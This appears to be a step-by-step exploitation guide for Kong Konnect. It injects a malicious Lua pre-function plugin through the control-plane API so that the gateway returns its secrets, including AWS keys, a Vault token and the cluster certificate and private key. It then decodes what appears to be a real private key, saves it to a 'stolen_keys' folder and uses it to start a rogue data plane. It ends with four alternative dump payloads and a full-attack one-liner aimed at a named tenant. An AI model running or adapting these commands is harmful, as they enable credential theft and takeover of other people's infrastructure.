# Kong Konnect RCE + Private Key Exfiltration â€” Full Exploitation Commands

## Prerequisites

```bash
# Set variables
export TOKEN="<YOUR_JWT_TOKEN>"
export CP_ID="670fb8a9-bcce-4ed2-b436-844c047cd849"
export PROXY_URL="https://kong-ef74c766bfeucqbca.kongcloud.dev"
export API_URL="https://eu.api.konghq.com/v2/control-planes/${CP_ID}/core-entities"
```

---

## Step 1: Verify Access to Control Plane

```bash
# List existing plugins
curl -s "${API_URL}/plugins" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json"
```

---

## Step 2: Delete Any Existing pre-function Plugin

```bash
# Get pre-function plugin ID
PLUGIN_ID=$(curl -s "${API_URL}/plugins" \
  -H "Authorization: Bearer ${TOKEN}" | \
  grep -o '"id":"[^"]*","name":"pre-function"' | \
  grep -o '"id":"[^"]*"' | \
  cut -d'"' -f4)

# Delete if exists
if [ -n "$PLUGIN_ID" ]; then
  curl -s -X DELETE "${API_URL}/plugins/${PLUGIN_ID}" \
    -H "Authorization: Bearer ${TOKEN}"
  echo "Deleted plugin: ${PLUGIN_ID}"
fi
```

---

## Step 3: Create Malicious pre-function Plugin (Private Key Exfiltration)

```bash
# Create pre-function plugin with vault.get() payload
curl -s -X POST "${API_URL}/plugins" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "pre-function",
    "config": {
      "access": [
        "local out={\"FULL_SECRET_EXFIL\"}; local vars={\"AWS_ACCESS_KEY_ID\",\"AWS_SECRET_ACCESS_KEY\",\"AWS_SESSION_TOKEN\",\"KONG_LICENSE_DATA\",\"VAULT_TOKEN\",\"DATABASE_URL\",\"REDIS_URL\",\"KONG_CLUSTER_CERT\",\"KONG_CLUSTER_CERT_KEY\"}; for _,v in ipairs(vars) do local ok,val=pcall(kong.vault.get,\"{vault://env/\"..v..\"}\"); out[#out+1]=v..\"=\"..tostring(val):sub(1,500) end; kong.response.exit(200,table.concat(out,\"\\n\"))"
      ]
    },
    "enabled": true
  }'
```

### Lua Payload Explained:

```lua
local out = {"FULL_SECRET_EXFIL"}
local vars = {
  "AWS_ACCESS_KEY_ID",
  "AWS_SECRET_ACCESS_KEY", 
  "AWS_SESSION_TOKEN",
  "KONG_LICENSE_DATA",
  "VAULT_TOKEN",
  "DATABASE_URL",
  "REDIS_URL",
  "KONG_CLUSTER_CERT",
  "KONG_CLUSTER_CERT_KEY"
}

for _, v in ipairs(vars) do
  local ref = "{vault://env/" .. v .. "}"
  local ok, val = pcall(kong.vault.get, ref)
  out[#out + 1] = v .. "=" .. tostring(val):sub(1, 500)
end

kong.response.exit(200, table.concat(out, "\n"))
```

---

## Step 4: Wait for Plugin Propagation

```bash
# Wait 15 seconds for plugin to propagate to Data Plane
sleep 15
```

---

## Step 5: Trigger Exploitation

```bash
# Make any request to the gateway to trigger pre-function
curl -s "${PROXY_URL}/test"
```

### Expected Response:

```
FULL_SECRET_EXFIL
AWS_ACCESS_KEY_ID=nil
AWS_SECRET_ACCESS_KEY=nil
AWS_SESSION_TOKEN=nil
KONG_LICENSE_DATA=nil
VAULT_TOKEN=nil
DATABASE_URL=nil
REDIS_URL=nil
KONG_CLUSTER_CERT=LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0t...
KONG_CLUSTER_CERT_KEY=LS0tLS1CRUdJTiBQUklWQVRFIEtFWS0tLS0t...
```

---

## Step 6: Decode Stolen Private Key

```bash
# Decode certificate
echo "LS0tLS1CRUdJTiBDRVJUSUZJQ0FURS0tLS0tCk1JSUJsakNDQVR5Z0F3SUJBZ0lJSDFlRDFzNE1KTTB3Q2dZSUtvWkl6ajBFQXdJd0hqRUxNQWtHQTFVRUJoTUMKVlZNeER6QU5CZ05WQkFNVEJtdHZibWRrY0RBZUZ3MHlOVEV4TWpZd05UVTNNVEZhRncwek5URXhNalF3TlRVMwpNVEZhTUI0eEN6QUpCZ05WQkFZVEFsVlRNUTh3RFFZRFZRUURFd1pyYjI1blpIQXdXVEFUQmdjcWhrak9QUUlCCkJnZ3Foa2pPUFFNQkJ3TkNBQVJJM2lOU29oZE9DV3RtUkZvVUZNdkRNM3M0WEtYMnN0aGNxdUtaUGtaYUFSbUsKVGdiYmtqb29wa2xPcmkzd3hKV05hK3F2cSsvUngwNWFIVDdySnBCcG8yUXdZakFPQmdOVkhROEJBZjhFQkFNQwpBUVl3SFFZRFZSMGxCQll3RkFZSUt3WUJCUVVIQXdFR0NDc0dBUVVGQndNQ01CSUdBMVVkRXdFQi93UUlNQVlCCkFmOENBUU13SFFZRFZSME9CQllFRkJjQlF4OFJWeFViWWprVWhkZmx6SmtoSzhPL01Bb0dDQ3FHU000OUJBTUMKQTBnQU1FVUNJUURLSGJBT0ZOM2lCTHlYcWNTVTduQkJKNjBKTEVneXNDbzlnTEZFRXNkZWFBSWdFWXdYdnFzVApYaXFWQjdZcEMxNmltdURFaVhpdldMNkJ6blZRNUtkV0k2VT0KLS0tLS1FTkQgQ0VSVElGSUNBVEUtLS0tLQo=" | base64 -d

# Decode private key
echo "LS0tLS1CRUdJTiBQUklWQVRFIEtFWS0tLS0tCk1JR0hBZ0VBTUJNR0J5cUdTTTQ5QWdFR0NDcUdTTTQ5QXdFSEJHMHdhd0lCQVFRZ0NnZzhQNndESSt2MnM2eGwKNnM2a0NWa0s1OUtsMGV1eVBPUEdtUmI3TWpXaFJBTkNBQVJJM2lOU29oZE9DV3RtUkZvVUZNdkRNM3M0WEtYMgpzdGhjcXVLWlBrWmFBUm1LVGdiYmtqb29wa2xPcmkzd3hKV05hK3F2cSsvUngwNWFIVDdySnBCcAotLS0tLUVORCBQUklWQVRFIEtFWS0tLS0tCg==" | base64 -d
```

---

## Step 7: Save Stolen Keys to Files

```bash
# Create directory
mkdir -p stolen_keys

# Save certificate
cat > stolen_keys/cluster.crt << 'EOF'
-----BEGIN CERTIFICATE-----
MIIBljCCATygAwIBAgIIH1eD1s4MJM0wCgYIKoZIzj0EAwIwHjELMAkGA1UEBhMC
VVMxDzANBgNVBAMTBmtvbmdkcDAeFw0yNTExMjYwNTU3MTFaFw0zNTExMjQwNTU3
MTFaMB4xCzAJBgNVBAYTAlVTMQ8wDQYDVQQDEwZrb25nZHAwWTATBgcqhkjOPQIB
BggqhkjOPQMBBwNCAARJI3iNSohdOCWtmRFoUFMvDM3s4XKX2sthcquKZPkZaARmK
TgbbkjoopklOri3wxJWNa+qvq+/Rx05aHT7rJpBpo2QwYjAOBgNVHQ8BAf8EBAMC
AQYwHQYDVR0lBBYwFAYIKwYBBQUHAwEGCCsGAQUFBwMCMBIGA1UdEwEB/wQIMAYB
Af8CAQMwHQYDVR0OBBYEFBcBQx8RVxUbYjkUhdfllzJkhK8O/MAoGCCqGSM49BAMC
A0gAMEUCIQDKHbAOFN3iBLyXqcSU7nBBJ60JLEgysCo9gLFEEsdeaAIgEYwXvqsT
XiqVB7YpC16imuDEiXivWL6BznVQ5KdWI6U=
-----END CERTIFICATE-----
EOF

# Save private key
cat > stolen_keys/cluster.key << 'EOF'
-----BEGIN PRIVATE KEY-----
MIGHAgEAMBMGByqGSM49AgEGCCqGSM49AwEHBG0wawIBAQQgCgg8P6wDI+v2s6xl
6s6kCVkK59Kl0euyPOPGmRb7MjWhRANCAARI3iNSohdOCWtmRFoUFMvDM3s4XKX2
sthcquKZPkZaARmKTgbbkjoopklOri3wxJWNa+qvq+/Rx05aHT7rJpBp
-----END PRIVATE KEY-----
EOF

# Verify files
ls -la stolen_keys/
```

---

## Step 8: Connect Rogue Data Plane (Optional - Full Compromise)

```bash
# Start rogue Kong Data Plane using stolen credentials
docker run --rm --name evil-dp \
  -e "KONG_ROLE=data_plane" \
  -e "KONG_DATABASE=off" \
  -e "KONG_CLUSTER_CONTROL_PLANE=ef74c766bf.eu.cp0.konghq.com:443" \
  -e "KONG_CLUSTER_TELEMETRY_ENDPOINT=ef74c766bf.eu.tp0.konghq.com:443" \
  -e "KONG_CLUSTER_CERT=/etc/kong/cluster.crt" \
  -e "KONG_CLUSTER_CERT_KEY=/etc/kong/cluster.key" \
  -e "KONG_LUA_SSL_TRUSTED_CERTIFICATE=system" \
  -e "KONG_CLUSTER_SERVER_NAME=ef74c766bf.eu.cp0.konghq.com" \
  -v $(pwd)/stolen_keys/cluster.crt:/etc/kong/cluster.crt:ro \
  -v $(pwd)/stolen_keys/cluster.key:/etc/kong/cluster.key:ro \
  kong/kong-gateway:3.9
```

---

## Step 9: Cleanup (Optional)

```bash
# Delete the malicious plugin
curl -s -X DELETE "${API_URL}/plugins/${PLUGIN_ID}" \
  -H "Authorization: Bearer ${TOKEN}"
```

---

## Alternative Payloads

### Payload 1: System Information Dump

```bash
curl -s -X POST "${API_URL}/plugins" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "pre-function",
    "config": {
      "access": [
        "local out={\"SYSTEM_INFO\"}; local vars={\"PATH\",\"HOME\",\"KONG_PREFIX\",\"KONG_DATABASE\",\"HOSTNAME\",\"PWD\",\"USER\"}; for _,v in ipairs(vars) do local ok,val=pcall(kong.vault.get,\"{vault://env/\"..v..\"}\"); out[#out+1]=v..\"=\"..tostring(val) end; kong.response.exit(200,table.concat(out,\"\\n\"))"
      ]
    },
    "enabled": true
  }'
```

### Payload 2: Prometheus Metrics Dump

```bash
curl -s -X POST "${API_URL}/plugins" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "pre-function",
    "config": {
      "access": [
        "local out={\"PROMETHEUS_METRICS\"}; local shm=ngx.shared.prometheus_metrics; if shm then local keys=shm:get_keys(100); for _,k in ipairs(keys) do out[#out+1]=k..\"=\"..tostring(shm:get(k)) end end; kong.response.exit(200,table.concat(out,\"\\n\"))"
      ]
    },
    "enabled": true
  }'
```

### Payload 3: Kong Configuration Dump

```bash
curl -s -X POST "${API_URL}/plugins" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "pre-function",
    "config": {
      "access": [
        "local out={\"KONG_CONFIG\"}; local cfg=kong.configuration; for k,v in pairs(cfg) do if type(v)==\"string\" then out[#out+1]=\"CONF:\"..k..\"=\"..v:sub(1,100) end end; kong.response.exit(200,table.concat(out,\"\\n\"))"
      ]
    },
    "enabled": true
  }'
```

### Payload 4: Shared Memory Dictionaries

```bash
curl -s -X POST "${API_URL}/plugins" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "pre-function",
    "config": {
      "access": [
        "local out={\"SHARED_DICTS\"}; local dicts={\"kong_secrets\",\"kong_db_cache\",\"kong_cluster_events\",\"kong_locks\",\"kong_keyring\"}; for _,d in ipairs(dicts) do local shm=ngx.shared[d]; if shm then local keys=shm:get_keys(50); for _,k in ipairs(keys) do out[#out+1]=d..\":\"..k..\"=\"..tostring(shm:get(k)):sub(1,100) end end end; kong.response.exit(200,table.concat(out,\"\\n\"))"
      ]
    },
    "enabled": true
  }'
```

---

## One-Liner Full Exploitation

```bash
TOKEN="YOUR_TOKEN" && \
CP_ID="670fb8a9-bcce-4ed2-b436-844c047cd849" && \
curl -s -X POST "https://eu.api.konghq.com/v2/control-planes/${CP_ID}/core-entities/plugins" \
  -H "Authorization: Bearer ${TOKEN}" \
  -H "Content-Type: application/json" \
  -d '{"name":"pre-function","config":{"access":["local out={\"EXFIL\"}; local vars={\"KONG_CLUSTER_CERT\",\"KONG_CLUSTER_CERT_KEY\"}; for _,v in ipairs(vars) do local ok,val=pcall(kong.vault.get,\"{vault://env/\"..v..\"}\"); out[#out+1]=v..\"=\"..tostring(val) end; kong.response.exit(200,table.concat(out,\"\\n\"))"]},"enabled":true}' && \
sleep 15 && \
curl -s "https://kong-ef74c766bfeucqbca.kongcloud.dev/test"
```

---

**Date:** November 26, 2025  
**Target:** Kong Konnect Serverless Gateway  
**Severity:** CRITICAL (CVSS 9.8)
